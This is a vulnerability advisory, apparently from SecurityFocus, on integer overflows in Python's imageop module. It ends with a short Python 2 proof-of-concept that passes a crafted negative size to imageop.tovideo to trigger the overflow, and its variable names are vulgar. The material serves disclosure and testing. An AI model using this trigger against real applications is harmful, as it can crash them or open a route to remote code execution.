source: http://www.securityfocus.com/bid/25696/info

Python's imageop module is prone to multiple integer-overflow vulnerabilities because it fails to properly bounds-check user-supplied input to ensure that integer operations do not overflow.

To successfully exploit these issues, an attacker must be able to control the arguments to imageop functions. Remote attackers may be able to do this, depending on the nature of applications that use the vulnerable functions.

Attackers would likely submit invalid or specially crafted images to applications that perform imageop operations on the data.

A successful exploit may allow attacker-supplied machine code to run in the context of affected applications, facilitating the remote compromise of computers. 

#!/usr/bin/python

import imageop

sexshit = "a"*1603
evil = "p"*5241
connard = "s"*2000
supaire= "45"*65
print supaire
connard = "cool"
salope = "suceuse"
dtc = imageop.tovideo(sexshit,1,4461,-2147002257)
sexshit = "dtc"*52
print connard,supaire," fin de dump" 